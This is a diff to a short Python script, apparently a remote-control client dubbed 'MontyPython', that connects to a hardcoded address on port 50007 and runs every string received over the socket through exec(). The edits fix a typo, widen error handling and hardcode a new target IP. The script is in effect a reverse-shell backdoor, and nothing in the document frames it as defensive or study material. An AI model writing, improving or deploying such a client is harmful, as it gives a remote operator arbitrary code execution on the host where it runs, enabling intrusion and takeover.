@@ -3,7 +3,7 @@ import sys
 import argparse
 
 class client:
-    def __init__(self,ip_addr,port, recv=1024,quiet=True):
+    def __init__(self,ip_addr,port, recv=2018,quiet=True):
         #args
         self.ip_addr =ip_addr
         self.port=port
@@ -15,7 +15,7 @@ class client:
         #main
         self.becomeServant()
         self.closeConn()
-    def recieveData(self):
+    def receiveData(self):
         return self.soc.recv(self.recv)
     def log(self,msg):
         if not self.quiet:
@@ -27,18 +27,21 @@ class client:
     def becomeServant(self):
         while True:
             try:
-                command = self.recieveData()
+                command = self.receiveData()
                 self.log("[%s]>>>%s"%(self.ip_addr,command.decode()))
                 command = str(command.decode())
+                #print("---------------------------------------------------------")
+                #print(command)
+                #print("---------------------------------------------------------")
                 exec(command)
-            except:
-                    self.log("[Error for command] %s"%command )
-            continue
+            except BaseException as error:
+                #print("ERRRRRRR"+str(error))
+                self.log("[Error for command] %s"%error )
 
 if __name__ == "__main__":
-    parser= argparse.ArgumentParser()
-    parser.add_argument("-i","--ip",default= "192.168.31.58",type=str,help=" Specify the Ipv4 defaults to: 192.168.31.58")
-    parser.add_argument("-p", "--port", default=50007, type=int, help=" Specify the Port defaults to: 50007")
-    args = parser.parse_args()
-    MontyPython = client(args.ip,args.port)
-    #MontyPython = client('192.168.1.4', 50007)
+    #parser= argparse.ArgumentParser()
+    #parser.add_argument("-i","--ip",default= "192.168.31.58",type=str,help=" Specify the Ipv4 defaults to: 192.168.31.58")
+    #parser.add_argument("-p", "--port", default=50007, type=int, help=" Specify the Port defaults to: 50007")
+    #args = parser.parse_args()
+    #MontyPython = client(args.ip,args.port)
+    MontyPython = client('192.168.1.73', 50007)
